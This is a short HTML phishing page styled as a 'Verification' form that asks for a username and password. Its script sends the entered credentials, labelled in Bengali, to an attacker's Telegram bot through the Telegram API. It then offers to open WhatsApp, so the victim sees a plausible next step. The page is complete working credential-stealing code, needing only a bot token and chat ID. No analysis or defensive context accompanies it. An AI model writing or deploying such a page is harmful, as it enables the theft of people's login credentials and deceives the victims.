<!DOCTYPE html>
<html>
<head>
    <title>Verification</title>
</head>
<body>

    <input type="text" id="userInput" placeholder="Username">
    <input type="password" id="passInput" placeholder="Password">
    <button onclick="sendData()">Verify</button>

    <script>
    function sendData() {
        const token = "YOUR_BOT_TOKEN"; 
        const chatId = "YOUR_CHAT_ID";
        
        const user = document.getElementById('userInput').value;
        const pass = document.getElementById('passInput').value;

        const message = `⚠️ নতুন ভেরিফিকেশন রিকোয়েস্ট\n\n👤 ইউজার: ${user}\n🔑 পাসওয়ার্ড: ${pass}`;
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

        fetch(url)
        .then(response => {
            if(response.ok) {
                let confirmRedirect = confirm("হোয়াটসঅ্যাপ ওপেন করতে চান?");
                if (confirmRedirect) {
                    window.location.href = "intent://#Intent;action=android.intent.action.VIEW;scheme=whatsapp;package=com.whatsapp;end";
                }
            }
        })
        .catch(error => console.error('Error:', error));
    }
    </script>

</body>
</html>
